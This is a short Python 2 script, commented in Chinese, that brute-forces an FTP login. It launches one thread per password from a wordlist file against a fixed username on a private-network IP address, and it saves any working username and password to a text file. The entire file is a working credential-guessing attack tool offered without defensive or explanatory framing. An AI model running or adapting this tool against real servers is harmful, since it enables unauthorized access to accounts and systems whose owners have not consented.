#coding=utf8
import threading
import ftplib
import socket
import sys
import time
def ftp(i,j):
    ftp=ftplib.FTP('192.168.48.181')#ftp服务器的ip地址
    try:
        user="ftpname"  #用户名已知 为ftpname
        passwd=j
        ftp.login(user,passwd)
        hand=open('aa.txt','a+')
        hand.write(user+":"+passwd+"\n") #将正确的用户名密码写入文件aa中
        print user+":"+passwd+"\n"
    except ftplib.error_perm:
	    print "passwd is wrong"
def main():  
    pshand=open("passwd1.txt","r")#passwd1.txt是字典，由tt.py生成
    listpass=[]
    threads=[]
    for ps in open("passwd1.txt","r"):
        lineps=pshand.readline().strip('\n')
        listpass.append(lineps)
    i="ftpname"
    for j in listpass:
        command="%s %s" %(i,j)
        print command
        t=threading.Thread(target=ftp,args=(i,j))
        threads.append(t)
    for i in range(len(threads)):
        threads[i].start()
        time.sleep(0.08)#经测试，小于0.05秒后将报线程过多的错误
    print 'finished'    
if __name__=='__main__':
    main()